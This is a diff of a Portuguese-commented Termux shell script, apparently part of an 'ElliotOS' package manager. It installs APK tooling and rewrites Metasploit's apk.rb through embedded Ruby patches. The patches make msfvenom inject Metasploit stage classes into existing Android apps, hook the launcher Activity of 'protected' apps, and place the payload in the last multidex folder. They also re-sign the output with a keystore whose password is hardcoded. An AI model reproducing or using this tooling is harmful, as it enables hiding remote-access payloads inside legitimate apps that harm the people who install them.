+new_g = "    # MSF_AE_PAYLOAD_GLOB_V2: apkeditor usa smali/classes/, apktool usa smali/\n    payload_smali_base = Dir.exist?(\"\#{tempdir}/payload/smali/classes\") ? \"\#{tempdir}/payload/smali/classes\" : \"\#{tempdir}/payload/smali\"\n    payload_files = Dir.glob(\"\#{payload_smali_base}/com/metasploit/stage/*.smali\")"
+File.write(ARGV[0], src.include?(old) ? src.sub(old, new_g) : src)
+RBFIXGLOB
+        grep -q 'MSF_AE_PAYLOAD_GLOB_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: payload glob corrigido" || _warn "Fix GLOB nao aplicado"
+    fi
+
+    # Fix DIR: supersedido pelo MULTIDEX_V2 — verifica ambos
+    if grep -q 'MSF_AE_PAYLOAD_DIR_V2\|MSF_AE_MULTIDEX_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: payload dir ja corrigido"
+    else
+        _info "apk.rb fix dir: payload dir smali/classes/ path..."
+        ruby - "$apkrb" << 'RBFIXDIR'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_PAYLOAD_DIR_V2')
+old = "    payload_dir = \"\#{tempdir}/original/smali/\#{package_slash}/\""
+new_d = "    # MSF_AE_PAYLOAD_DIR_V2\n    _orig_smali_base = Dir.exist?(\"\#{tempdir}/original/smali/classes\") ? \"\#{tempdir}/original/smali/classes\" : \"\#{tempdir}/original/smali\"\n    payload_dir = \"\#{_orig_smali_base}/\#{package_slash}/\""
+File.write(ARGV[0], src.include?(old) ? src.sub(old, new_d) : src)
+RBFIXDIR
+        grep -q 'MSF_AE_PAYLOAD_DIR_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: payload dir corrigido" || _warn "Fix DIR nao aplicado"
+    fi
+
+    # ── Fix CLASSES_PATH: supersedido pelo FIND_V2 — verifica ambos ────────
+    if grep -q 'MSF_AE_CLASSES_PATH\|MSF_AE_FIND_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: classes path ja corrigido"
+    else
+        _info "apk.rb fix classes_path: adiciona smali*/classes/ na busca do hook..."
+        ruby - "$apkrb" << 'RBFIXCP'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_CLASSES_PATH')
+old = '    if smalifile.blank?' + "
+" +
+      '      raise "Unable to find class file: #{hookable_class_filepath}"' + "
+" +
+      '    end'
+new = '    if smalifile.blank?' + "
+" +
+      '      # MSF_AE_CLASSES_PATH: APKEditor usa smali/classes/' + "
+" +
+      '      smalifile = Dir.glob("#{tempdir}/original/smali*/classes/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "
+" +
+      '    end' + "
+" +
+      '    if smalifile.blank?' + "
+" +
+      '      smalifile = Dir.glob("#{tempdir}/original/smali*/**/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "
+" +
+      '    end' + "
+" +
+      '    if smalifile.blank?' + "
+" +
+      '      raise "Unable to find class file: #{hookable_class_filepath}"' + "
+" +
+      '    end'
+src = src.sub(old, new) if src.include?(old)
+File.write(ARGV[0], src)
+RBFIXCP
+        grep -q 'MSF_AE_CLASSES_PATH' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: classes path corrigido" || _warn "Fix CLASSES_PATH nao aplicado"
+    fi
+
+    # ── Fix NONST_FIX_V2: copia toda arvore com/metasploit/ exceto stage/ ────
+    if grep -q 'MSF_AE_NONST_FIX_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: non-stage classes ja corrigido (V2)"
+    else
+        _info "apk.rb fix nonst_v2: copia com/metasploit/** recursivo exceto stage/..."
+        ruby - "$apkrb" << 'RBFIXNS'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_NONST_FIX_V2')
+old = '    FileUtils.mkdir_p payload_dir' + "
+
+" +
+      '    # Copy over the payload files'
+new = '    FileUtils.mkdir_p payload_dir' + "
+
+" +
+      '    # MSF_AE_NONST_FIX_V2: copia toda arvore com/metasploit/ exceto stage/' + "
+" +
+      '    Dir.glob("#{payload_smali_base}/com/metasploit/**/*.smali").each do |_nsf|' + "
+" +
+      '      next if _nsf.include?("/com/metasploit/stage/")' + "
+" +
+      '      _rel = _nsf.sub("#{payload_smali_base}/", "")' + "
+" +
+      '      _dest = "#{_orig_smali_base}/#{_rel}"' + "
+" +
+      '      FileUtils.mkdir_p(File.dirname(_dest))' + "
+" +
+      '      _nc = File.binread(_nsf)' + "
+" +
+      "      _nc.gsub!('com/metasploit/stage', package_slash)" + "
+" +
+      '      File.open(_dest, "wb") { |f| f.puts _nc }' + "
+" +
+      '    end' + "
+
+" +
+      '    # Copy over the payload files'
+src = src.sub(old, new) if src.include?(old)
+File.write(ARGV[0], src)
+RBFIXNS
+        grep -q 'MSF_AE_NONST_FIX_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: non-stage classes corrigido (V2)" || _warn "Fix NONST_V2 nao aplicado"
+    fi
+
+    # ── Fix FALLBACK_ACTIVITY: quando Application smali nao existe, usa launcher Activity ─
+    if grep -q 'MSF_AE_FALLBACK_ACTIVITY' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: fallback launcher Activity ja configurado"
+    else
+        _info "apk.rb fix fallback_activity: fallback para launcher Activity quando app protegido..."
+        ruby - "$apkrb" << 'RBFIXFA'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_FALLBACK_ACTIVITY')
+old = '    if smalifile.blank?' + "
+" +
+      '      raise "Unable to find hookable smali (tried Application class and launcher Activity)"' + "
+" +
+      '    end'
+# Se ja tem o bloco de fallback activity, nao precisa adicionar de novo
+unless src.include?('MSF_AE_FALLBACK_ACTIVITY') || src.include?('tentando launcher Activity')
+  old2 = '    if smalifile.blank?' + "
+" +
+         '      raise "Unable to find class file: #{hookable_class_filename} in #{tempdir}/original/"' + "
+" +
+         '    end'
+  new2 = '    # MSF_AE_FALLBACK_ACTIVITY: app protegido? tenta launcher Activity' + "
+" +
+         '    if smalifile.blank?' + "
+" +
+         '      print_status "Application class smali nao encontrado (app protegido?), tentando launcher Activity...
+"' + "
+" +
+         '      _activities = amanifest.xpath("//activity|//activity-alias")' + "
+" +
+         '      _pkg = amanifest.xpath("//manifest").first["package"]' + "
+" +
+         '      _activities.each do |_act|' + "
+" +
+         '        _aname = _act.attribute("targetActivity").to_s' + "
+" +
+         '        _aname = _act.attribute("name").to_s if _aname.blank?' + "
+" +
+         '        next if _aname.blank?' + "
+" +
+         '        _cats = _act.search("category")' + "
+" +
+         '        next unless _cats.any? { |c| ["android.intent.category.LAUNCHER","android.intent.action.MAIN"].include?(c.attribute("name").to_s) }' + "
+" +
+         '        _aname = _pkg + _aname if _aname.start_with?(".")' + "
+" +
+         '        _afname = _aname.gsub(".", "/") + ".smali"' + "
+" +
+         '        smalifile = Dir.glob("#{tempdir}/original/**/" + _afname).select { |f| File.readable?(f) }.flatten.first' + "
+" +
+         '        break unless smalifile.blank?' + "
+" +
+         '      end' + "
+" +
+         '    end' + "
+" +
+         '    if smalifile.blank?' + "
+" +
+         '      raise "Unable to find hookable smali (tried Application class and launcher Activity)"' + "
+" +
+         '    end'
+  src = src.sub(old2, new2) if src.include?(old2)
+end
+File.write(ARGV[0], src)
+RBFIXFA
+        grep -q 'MSF_AE_FALLBACK_ACTIVITY' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: fallback launcher Activity configurado" || _warn "Fix FALLBACK_ACTIVITY nao aplicado"
+    fi
+
+    # ── Fix MULTIDEX_V2: payload no ultimo classes/ para evitar overflow 64K ──
+    if grep -q 'MSF_AE_MULTIDEX_V2' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: multidex payload ja configurado (V2)"
+    else
+        _info "apk.rb fix multidex_v2: payload no ultimo classes/ (evita overflow 64K)..."
+        ruby - "$apkrb" << 'RBFIXMX'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_MULTIDEX_V2')
+old = '    # MSF_AE_PAYLOAD_DIR_V2' + "
+" +
+      '    _orig_smali_base = Dir.exist?("#{tempdir}/original/smali/classes") ? "#{tempdir}/original/smali/classes" : "#{tempdir}/original/smali"' + "
+" +
+      '    payload_dir = "#{_orig_smali_base}/#{package_slash}/"'
+new = '    # MSF_AE_MULTIDEX_V2: payload no ultimo classes/ para evitar overflow 64K' + "
+" +
+      '    _smali_root = "#{tempdir}/original/smali"' + "
+" +
+      '    _classes_dirs = Dir.glob("#{_smali_root}/classes*/").sort' + "
+" +
+      '    if _classes_dirs.empty?' + "
+" +
+      '      _orig_smali_base = Dir.exist?("#{_smali_root}/classes") ? "#{_smali_root}/classes" : _smali_root' + "
+" +
+      '    else' + "
+" +
+      '      _orig_smali_base = _classes_dirs.last.chomp("/")' + "
+" +
+      '    end' + "
+" +
+      '    payload_dir = "#{_orig_smali_base}/#{package_slash}/"'
+src = src.sub(old, new) if src.include?(old)
+File.write(ARGV[0], src)
+RBFIXMX
+        grep -q 'MSF_AE_MULTIDEX_V2' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: multidex payload configurado" || _warn "Fix MULTIDEX_V2 nao aplicado"
+    fi
 }
 
 # Garante que o banco de dados do Metasploit existe e esta rodando.
@@ -94453,753 +94887,338 @@ _backend_npm() {
 # release no GitHub e criamos um wrapper próprio (não dependemos do formato
 # interno do script oficial, que muda de versão pra versão).
 _backend_apktool() {
-    local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
-    local dest="$HOME/.xpm/tools/apktool"
-    mkdir -p "$dest"
-
-    # ── 1. Java (dependência obrigatória do apktool) ─────────────────────────
-    if ! command -v java &>/dev/null; then
-        _info "Instalando OpenJDK (dependência do apktool)..."
-        pkg install -y openjdk-17 || _die "Falha ao instalar openjdk-17"
-    fi
-    _ok "Java: $(java -version 2>&1 | head -1)"
-
-    # ── 2. aapt/aapt2 — usados pelo apktool pra compilar recursos/manifest ──
-    # IMPORTANTE: o aapt2 que vem embutido dentro do apktool.jar é um binário
-    # x86, que não roda em ARM/Android. Sem substituí-lo, "apktool d" falha
-    # silenciosamente e nem chega a escrever o AndroidManifest.xml (é
-    # exatamente o erro que o msfvenom mostra ao tentar embutir payload).
-    # O pacote "aapt" do Termux compila aapt nativo pra arquitetura do
-    # aparelho, então instalamos ele também.
-    command -v aapt &>/dev/null || pkg install -y aapt 2>/dev/null || true
-
-    # aapt2: NUNCA confiamos cegamente em "já existe algo no PATH". Um aapt2
-    # velho (sessão anterior, instalação manual, outro pacote na frente no
-    # PATH) pode ficar parado ali pra sempre, porque o guard antigo
-    # ("command -v aapt2 || pkg install") só instalava se NADA respondesse
-    # por esse nome — nunca verificava versão nem atualizava. Foi exatamente
-    # isso que causou o "unknown option '--no-compile-sdk-metadata'": o
-    # apktool 2.12.1 sempre injeta essa flag no "aapt2 link", e ela só existe
-    # em builds do aapt2 relativamente recentes — se o binário resolvido
-    # pelo PATH for velho demais, o link quebra com um stacktrace Java sem
-    # nenhuma pista real da causa.
-    #
-    # Fix de verdade: forçamos o pacote "aapt2" do Termux (fonte mantida e
-    # atualizada) a instalar/atualizar sempre, copiamos o binário resultante
-    # pra dentro do diretório do xpm (fora do PATH genérico, então nenhuma
-    # outra ferramenta/instalação antiga pode sombrear ele) e testamos
-    # FUNCIONALMENTE se aquele binário específico aceita a flag — em vez de
-    # comparar números de versão, que não têm correspondência 1:1 confiável
-    # entre apktool e aapt2. O apktool wrapper (abaixo) passa a apontar
-    # sempre pra essa cópia pinada via "--aapt", nunca mais pro que o PATH
-    # resolver.
-    _info "Instalando/atualizando aapt2 (Termux)..."
-    pkg install -y aapt2 2>/dev/null || pkg reinstall -y aapt2 2>/dev/null || true
-
-    local _aapt2_system
-    _aapt2_system="$(command -v aapt2 2>/dev/null || echo "$BPFX/bin/aapt2")"
-
-    # IMPORTANTE: link simbólico, NUNCA cópia (cp). aapt2 é linkado
-    # dinamicamente contra libprotobuf/libabsl do sistema Termux; se a
-    # gente copiar os bytes do binário, essa cópia fica congelada com as
-    # libs de quando foi feita. Um "pkg upgrade" seguinte pode atualizar
-    # libprotobuf/libabsl (ABI instável entre versões) e o binário "ao
-    # vivo" do Termux ($PREFIX/bin/aapt2) acompanha automaticamente porque
-    # o pacote mantém tudo em sincronia — mas uma cópia nossa não, e passa
-    # a falhar com "CANNOT LINK EXECUTABLE ... cannot locate symbol ..."
-    # (erro do linker dinâmico, não do apktool). Um symlink sempre aponta
-    # pro binário atual, então acompanha qualquer upgrade de graça.
-    if [ -x "$_aapt2_system" ]; then
-        ln -sf "$_aapt2_system" "$dest/aapt2-real"
+    # apktool puro via pkg — SEM wrapper, compatível com msfvenom -x
+    _info "Instalando apktool..."
+    pkg reinstall -y apktool 2>/dev/null || pkg install -y apktool 2>/dev/null || true
+    hash -r 2>/dev/null || true
+    if command -v apktool >/dev/null 2>&1; then
+        _ok "apktool instalado: $(apktool --version 2>/dev/null | head -1)"
     else
-        _warn "aapt2 não encontrado mesmo após 'pkg install' — o build de APKs vai falhar"
+        _warn "apktool não encontrado — verifique o repo do Termux"
     fi
+    [ -f "$HOME/.local/bin/apktool" ] && rm -f "$HOME/.local/bin/apktool" && _ok "wrapper V1 legado removido"
+}
 
-    # ── 2.2 Verificação funcional de compatibilidade com apktool 2.12.1 ─────
-    local _aapt2_ok=1
-    if [ -x "$dest/aapt2-real" ]; then
-        "$dest/aapt2-real" link -h 2>&1 | grep -q -- '--no-compile-sdk-metadata' || _aapt2_ok=0
-    else
-        _aapt2_ok=0
-    fi
 
-    if [ "$_aapt2_ok" = "1" ]; then
-        _ok "aapt2 compatível (--no-compile-sdk-metadata suportado) — pinado em $dest/aapt2-real"
-        ln -sf "$dest/aapt2-real" "$dest/aapt2"
-    else
-        _warn "aapt2 do Termux não reconhece --no-compile-sdk-metadata (pacote desatualizado no repo)."
-        _warn "Aplicando shim de compatibilidade — remove só essa flag, resto do build roda normal."
-        cat > "$dest/aapt2" << SHIMEOF
-#!/usr/bin/env bash
-# Shim de compatibilidade: o aapt2 empacotado pelo Termux nesta instalação
-# não reconhece "--no-compile-sdk-metadata" (flag que o apktool 2.12.1
-# sempre injeta no "aapt2 link"). Ela só controla se metadados de SDK de
-# compilação são embutidos no resources.arsc — não afeta o funcionamento
-# do APK final, só remove um metadado cosmético. Filtramos só ela e
-# repassamos o resto intacto pro binário real.
-# De vez em quando rode "pkg upgrade aapt2" pra ver se o Termux já corrigiu
-# o pacote; se sim, rode "xpm install apktool" de novo pra remover este shim.
-_args=()
-for _a in "\$@"; do
-    [ "\$_a" = "--no-compile-sdk-metadata" ] && continue
-    _args+=("\$_a")
-done
-exec "$dest/aapt2-real" "\${_args[@]}"
-SHIMEOF
-        chmod +x "$dest/aapt2"
-    fi
+# ── backend apkfull — kit completo de ferramentas APK ──────────────────────
+_backend_apkfull() {
+    # 1. apktool puro via pkg (msfvenom -x usa o binário diretamente)
+    _backend_apktool
 
-    # ── 2.1 apksigner — assina o APK recompilado pelo apktool ────────────────
-    # Existe pronto no repo do Termux (diferente do apktool), então usamos
-    # pkg direto — não precisa de backend próprio nem compilação.
-    if ! command -v apksigner &>/dev/null; then
-        _info "Instalando apksigner (assinatura de APK)..."
-        pkg install -y apksigner 2>/dev/null || _warn "Falha ao instalar apksigner — assine manualmente depois"
-    fi
+    # 2. apksigner + aapt + aapt2 + apkeep
+    _info "Instalando apksigner, aapt, aapt2, apkeep..."
+    pkg install -y apksigner aapt aapt2 apkeep 2>/dev/null || true
 
-    # ── 3. Baixa uma versão fixa (2.x) do apktool ────────────────────────────
-    # NÃO pegamos mais a "latest release": o apktool 3.0 removeu a flag
-    # "--only-main-classes", que o próprio metasploit-framework usa fixa no
-    # código (lib/msf/core/payload/apk.rb) pra decodificar o APK original.
-    # Com apktool 3.x essa flag é rejeitada, o decode aborta e o msfvenom
-    # quebra com "AndroidManifest.xml not found" — sem stacktrace nenhum.
-    # v2.12.1 é a última 2.x estável e mantém compatibilidade com o msfvenom.
-    local APKTOOL_PIN="v2.12.1"
-    _info "Baixando apktool $APKTOOL_PIN (fixado por compatibilidade com o msfvenom)..."
-    local jar_url
-    jar_url=$(curl -fsSL "https://api.github.com/repos/iBotPeaches/Apktool/releases/tags/${APKTOOL_PIN}" 2>/dev/null \
-        | grep -o '"browser_download_url"[[:space:]]*:[[:space:]]*"[^"]*\.jar"' \
-        | sed -E 's/.*"(https:[^"]+)"/\1/' | head -1)
-    [ -n "$jar_url" ] || _die "Não foi possível localizar o .jar do apktool ${APKTOOL_PIN} no GitHub"
-
-    _info "Baixando $(basename "$jar_url")..."
-    curl -fsSL -o "$dest/apktool.jar" "$jar_url" || _die "Falha ao baixar apktool.jar"
-
-    # ── 3.1 apktool 3.x — motor de fallback OPCIONAL, só pro "ms --apk" ──────
-    # O wrapper principal (abaixo) continua 100% em 2.12.1 — msfvenom precisa
-    # de "--only-main-classes" (removido no 3.x) e não pode quebrar por isso.
-    # Mas o 3.x é um "Apktool Remastered": parser de recursos reescrito do
-    # zero, framework mais novo (API 35+), e correções reais em apps
-    # grandes/complexos que o 2.12.1 nunca vai receber (ex: ordenação de
-    # recursos do WhatsApp). Pra APKs que o motor 2.x pinado não fecha de
-    # jeito nenhum, ter esse motor como ÚLTIMO recurso — só dentro do
-    # "ms --apk", nunca no caminho do msfvenom — aumenta a cobertura real
-    # sem arriscar a integração já validada. Melhor esforço de propósito:
-    # se a rede não estiver disponível ou o GitHub mudar o formato do
-    # release, o "ms --apk" simplesmente não oferece esse último nível e
-    # avisa isso claramente — nunca trava a instalação do apktool 2.x, que
-    # é o que o resto do ElliotOS (msfvenom incluso) realmente depende.
-    _info "Baixando apktool 3.x (motor de fallback opcional pro 'ms --apk')..."
-    local jar3_url
-    jar3_url=$(curl -fsSL "https://api.github.com/repos/iBotPeaches/Apktool/releases/latest" 2>/dev/null \
-        | grep -o '"browser_download_url"[[:space:]]*:[[:space:]]*"[^"]*\.jar"' \
-        | sed -E 's/.*"(https:[^"]+)"/\1/' | head -1)
-    if [ -n "$jar3_url" ] && curl -fsSL -o "$dest/apktool3.jar" "$jar3_url" 2>/dev/null; then
-        _ok "apktool 3.x baixado como motor de fallback: $(basename "$jar3_url")"
-    else
-        rm -f "$dest/apktool3.jar" 2>/dev/null
-        _warn "Não foi possível baixar o apktool 3.x (opcional) — 'ms --apk' vai pular esse nível de fallback"
-    fi
-
-    # ── 4. Wrapper próprio no PATH ────────────────────────────────────────────
-    # IMPORTANTE (apktool 3.x): as flags curtas mudaram de significado.
-    # Em "apktool d" (decode), "-a" agora é "--all-src" (outra opção
-    # completamente diferente) — injetar "-a <path>" ali quebra o parser
-    # de argumentos e o path do aapt2 acaba virando um "segundo apk" bugado,
-    # fazendo o decode abortar sem nem escrever o AndroidManifest.xml.
-    # Além disso, a partir do apktool 3.x o decode não usa mais aapt2 externo
-    # (parser de recursos foi reescrito em Java puro). Só o BUILD ainda
-    # precisa do aapt2, e a flag correta lá é a longa: "--aapt <path>".
-    #
-    # IMPORTANTE (aapt2 legacy x recursos '$'): em APKs modernos com
-    # AnimatedVectorDrawableCompat, o AGP gera resources auxiliares tipo
-    # "$avd_hide_password__0", "$ic_launcher_foreground__0" etc. O aapt2
-    # com "--legacy" rejeita esses nomes ("invalid entry name") e o BUILD
-    # inteiro aborta antes mesmo de compilar o resto dos recursos válidos.
-    # Como fixamos o apktool em 2.x (ver comentário acima) não dá pra
-    # esperar um fix upstream, então o wrapper varre o projeto ANTES de
-    # cada "b"/"build" e remove essas entradas — são só estados
-    # intermediários de animação, a remoção não quebra o app, só perde a
-    # transição animada específica daquele ícone.
-    cat > "$BPFX/bin/apktool" << WEOF
-#!/usr/bin/env bash
-# XPM_APKTOOL_WRAPPER_V14 (fix: apktool 3.x dropped short flags; -a agora é
-# --all-src no decode; só build aceita --aapt para aapt2 externo | fix:
-# RENOMEIA (não deleta) recursos '\$'-prefixados que quebram aapt2 --legacy,
-# corrigindo toda referência cruzada | fix: usa aapt2 pinado pelo xpm em vez
-# de PATH, com shim se --no-compile-sdk-metadata não for suportado | fix:
-# --frame-path fixo, pra decode e build sempre usarem o mesmo cache de
-# framework Android | fix: parsing do diretório-alvo pula flag+valor
-# corretamente | fix: placeholder pra símbolos órfãos em public.xml (tipos
-# de arquivo e de valor) | fix: deduplicação de símbolos repetidos no
-# public.xml | fix: PERFORMANCE — as funções de símbolos órfãos faziam um
-# find/grep completo na árvore de recursos POR SÍMBOLO do public.xml, o que
-# em apps grandes (milhares de entradas) causava builds de horas. Agora
-# indexam tudo uma vez só e fazem lookup em memória — mesmo resultado,
-# ordens de magnitude mais rápido | fix: falso-positivo em ids órfãos —
-# "id" é o único tipo de recurso que pode ser criado por USO ("@+id/nome"
-# em qualquer layout/menu/xml, não só em res/values/ids.xml); sem checar
-# isso, ids de UI legítimos eram tratados como órfãos, gerando um <item
-# type="id"> duplicado e quebrando o link do aapt2 com "resource id/X is
-# already defined") | fix: quarentena de recursos XML corrompidos/
-# adulterados — decode falho do apktool ou proteção anti-RE deliberada
-# (ex: resources.arsc apontando pra um PNG/binário no lugar de um .xml)
-# antes só quebravam o build sem aviso lá na frente; agora são detectados,
-# preservados em .xpm-quarantine, e substituídos por placeholder válido) |
-# fix: falso-positivo em cores órfãs — "color" é dual igual "drawable",
-# pode ser arquivo seletor de estado em res/color/nome.xml, não só valor
-# em values.xml; sem checar isso, apps com Material Components/AppCompat
-# geravam <color> duplicado e o aapt2 recusava com "conflicting value for
-# configuration ()") | fix: heap de JVM adaptativo — calcula -Xmx a partir
-# da RAM disponível em /proc/meminfo em vez de um valor fixo, evitando
-# OutOfMemoryError em APKs grandes/jogos sem exigir configuração manual)
-JAR="$dest/apktool.jar"
-# Sempre prefere a cópia pinada/verificada pelo xpm (elimina ambiguidade de
-# PATH: nenhum aapt2 velho ou de outra ferramenta pode ser usado por engano).
-# Só cai pro PATH genérico se, por algum motivo, essa cópia não existir.
-AAPT2_BIN="$dest/aapt2"
-[ -x "\$AAPT2_BIN" ] || AAPT2_BIN="\$(command -v aapt2 2>/dev/null)"
-
-# Diretório de framework fixo do xpm. Se decode e build usarem caches de
-# framework diferentes (ex: um "\$HOME/.local/share/apktool/framework" que
-# mudou entre duas sessões, ou dois usuários/dispositivos diferentes), os
-# IDs de recurso do android: podem não bater e o build falha achando que
-# faltam recursos que na real só estão registrados sob outro framework.
-FRAME_DIR="$dest/framework"
-mkdir -p "\$FRAME_DIR" 2>/dev/null
-
-# ── auto-fix: recursos '\$'-prefixados (AnimatedVectorDrawable) ────────────
-# NÃO deleta — renomeia (tira só o '\$' do nome) e corrige toda referência
-# cruzada no projeto inteiro. Deletar quebra qualquer animated-vector que
-# aponte pra esses sub-estados via aapt:attr, causando erro de recurso
-# ausente na recompilação (era exatamente o que a versão anterior fazia).
-_xpm_apktool_fix_dollar_resources() {
-    local proj="\$1"
-    [ -d "\$proj/res" ] || return 0
-
-    local f dir base newbase old_id new_id esc_old
-    find "\$proj/res" -type f -name '\$*' | while IFS= read -r f; do
-        dir="\$(dirname "\$f")"
-        base="\$(basename "\$f")"
-        newbase="\${base#\\\$}"
-        old_id="\${base%.*}"
-        new_id="\${newbase%.*}"
-
-        # segurança: nunca sobrescreve um recurso já existente com esse nome
-        if [ -e "\$dir/\$newbase" ]; then
-            continue
+    # wrapper apksigner caso venha como JAR sem binário
+    if ! command -v apksigner >/dev/null 2>&1; then
+        local _ks_jar="${PREFIX:-/data/data/com.termux/files/usr}/share/java/apksigner.jar"
+        if [ -f "$_ks_jar" ]; then
+            printf '#!/bin/sh\nexec java -jar %s "$@"\n' "$_ks_jar" \
+                > "${PREFIX:-/data/data/com.termux/files/usr}/bin/apksigner"
+            chmod +x "${PREFIX:-/data/data/com.termux/files/usr}/bin/apksigner"
+            _ok "apksigner wrapper criado"
+        else
+            _warn "apksigner.jar não encontrado — assinar APKs pode falhar"
         fi
+    fi
 
-        mv -f "\$f" "\$dir/\$newbase"
-        esc_old="\$(printf '%s' "\$old_id" | sed 's/[.[\\*^\$\\/]/\\\\&/g')"
+    # keystore EC P-256 (ms --apk, wrapper apktool)
+    local _ks_dir="$HOME/.xpm/tools/apktool"
+    local _ks="$_ks_dir/xpm-compat-test.keystore"
+    mkdir -p "$_ks_dir"
+    if [ ! -f "$_ks" ] && command -v keytool >/dev/null 2>&1; then
+        keytool -genkeypair -storepass xpm-compat-test -keypass xpm-compat-test \
+            -alias xpm-compat-test -keyalg EC -groupname secp256r1 -validity 10000 \
+            -dname "CN=ElliotOS XPM Compat Test,O=ElliotOS,C=BR" -deststoretype pkcs12 \
+            -keystore "$_ks" >/dev/null 2>&1 \
+            && _ok "Keystore EC P-256 gerada" \
+            || _warn "keytool falhou — rode xpm doctor pra tentar novamente"
+    fi
 
-        grep -rlF "\$old_id" "\$proj/res" 2>/dev/null | while IFS= read -r ref; do
-            sed -i "s/\${esc_old}/\${new_id}/g" "\$ref"
+    # 3. APKEditor (tur-repo + fallback JAR)
+    _backend_apkeditor
+
+    # 4. Wrapper apktool→APKEditor em $PREFIX/bin/apktool (V2)
+    local _BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
+    local _ATMPDIR="${TMPDIR:-$_BPFX/tmp}"
+    local _wrapper="$_BPFX/bin/apktool"
+    local _rbin_apkeditor=""
+    if command -v apkeditor >/dev/null 2>&1; then
+        _rbin_apkeditor="$(PATH="$_BPFX/bin:/usr/bin:/bin" command -v apkeditor)"
+    elif [ -f "$HOME/.xpm/tools/apkeditor/apkeditor" ]; then
+        _rbin_apkeditor="$HOME/.xpm/tools/apkeditor/apkeditor"
+    fi
+    if [ -n "$_rbin_apkeditor" ]; then
+        cat > "$_wrapper" << 'APKWEOF'
+#!/bin/sh
+# XPM_APKTOOL_AE_WRAPPER_V2 — apktool → APKEditor (ElliotOS)
+_AE="__AE_BIN__"
+_XPM_KS="$HOME/.xpm/tools/apktool/xpm-compat-test.keystore"
+_XPM_KS_ALIAS="xpm-compat-test"
+_XPM_KS_PASS="xpm-compat-test"
+
+export TMPDIR="${TMPDIR:-__ATMPDIR__}"
+mkdir -p "$TMPDIR" 2>/dev/null
+
+# OOM fix: heap adaptativo por contexto
+_mem_avail=$(awk '/MemAvailable/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
+case "$_mem_avail" in ''|*[!0-9]*) _mem_avail=256 ;; esac
+_clean_java_opts=$(printf "%s" "${_JAVA_OPTIONS:-}" | sed 's/-Xmx[0-9]*[mMgGkK]*//g;s/-Xms[0-9]*[mMgGkK]*//g')
+if [ -n "${BUNDLE_GEMFILE:-}" ]; then
+    _xmx=$(( _mem_avail / 2 ))
+    [ "$_xmx" -lt 128 ] && _xmx=128
+    [ "$_xmx" -gt 512 ] && _xmx=512
+else
+    _xmx=$(( _mem_avail * 2 / 3 ))
+    [ "$_xmx" -lt 128 ] && _xmx=128
+    [ "$_xmx" -gt 768 ] && _xmx=768
+fi
+export _JAVA_OPTIONS="-Xms32m -Xmx${_xmx}m -XX:+UseSerialGC -Djava.io.tmpdir=$TMPDIR ${_clean_java_opts}"
+
+_ae_sign() {
+    _apk="$1"; [ -f "$_apk" ] || return 0
+    command -v apksigner >/dev/null 2>&1 || return 0
+    [ -f "$_XPM_KS" ] || return 0
+    _stem="${_apk%.apk}"; _aligned="${_stem}-za.apk"
+    if command -v zipalign >/dev/null 2>&1; then
+        zipalign -f -p 4 "$_apk" "$_aligned" 2>/dev/null \
+            && mv -f "$_aligned" "$_apk" || rm -f "$_aligned"
+    fi
+    apksigner sign --ks "$_XPM_KS" --ks-key-alias "$_XPM_KS_ALIAS" \
+        --ks-pass "pass:$_XPM_KS_PASS" --key-pass "pass:$_XPM_KS_PASS" \
+        "$_apk" 2>/dev/null && printf '[xpm] APK assinado: %s\n' "$_apk" >&2
+}
+
+# Normaliza estrutura APKEditor → apktool apos decode
+# APKEditor: smali/classes/net/... e smali/classes2/com/...
+# apktool:   smali/net/...          e smali_classes2/com/...
+_ae_normalize_smali() {
+    _outdir="$1"
+    _smali="$_outdir/smali"
+    [ -d "$_smali/classes" ] || return 0
+    for _f in "$_smali/classes/"*; do
+        [ -e "$_f" ] || continue
+        mv -f "$_f" "$_smali/" 2>/dev/null
+    done
+    rmdir "$_smali/classes" 2>/dev/null
+    for _cd in "$_smali/classes"*/; do
+        [ -d "$_cd" ] || continue
+        _cn=$(basename "$_cd")
+        _tgt="$_outdir/smali_${_cn}"
+        mkdir -p "$_tgt"
+        for _f in "$_cd"*; do
+            [ -e "$_f" ] || continue
+            mv -f "$_f" "$_tgt/" 2>/dev/null
         done
+        rmdir "$_cd" 2>/dev/null
     done
 }
 
-# ── auto-fix: símbolos declarados em public.xml sem definição real ─────────
-# Classe de erro diferente do "\$"-prefixado: aqui o recurso genuinamente
-# não existe em lugar nenhum do projeto decompilado (nem arquivo, nem
-# entrada em values) — só a declaração de ID público sobrou. Comum em apps
-# oficiais do Google Play que passam por resource shrinking de App Bundle
-# (o conteúdo do recurso é removido, mas o ID é preservado — às vezes
-# porque outro módulo/split dinâmico ainda referencia esse ID, então NÃO
-# dá pra simplesmente apagar a declaração sem risco). Em vez de apagar,
-# cria um placeholder mínimo e válido pro tipo, preservando o ID slot —
-# se o app realmente tentar carregar esse recurso em algum caminho não
-# coberto por este .apk, ele recebe algo inofensivo em vez de crashar.
-_xpm_apktool_fix_orphaned_public_symbols() {
-    local proj="\$1"
-    local pub_xml="\$proj/res/values/public.xml"
-    [ -f "\$pub_xml" ] || return 0
+case "${1:-}" in
 
-    # ── índice ÚNICO de recursos "de arquivo" já existentes ──────────────
-    # UMA passada de find pra todo o projeto, em vez de uma passada POR
-    # símbolo do public.xml (que pode ter milhares de entradas em apps
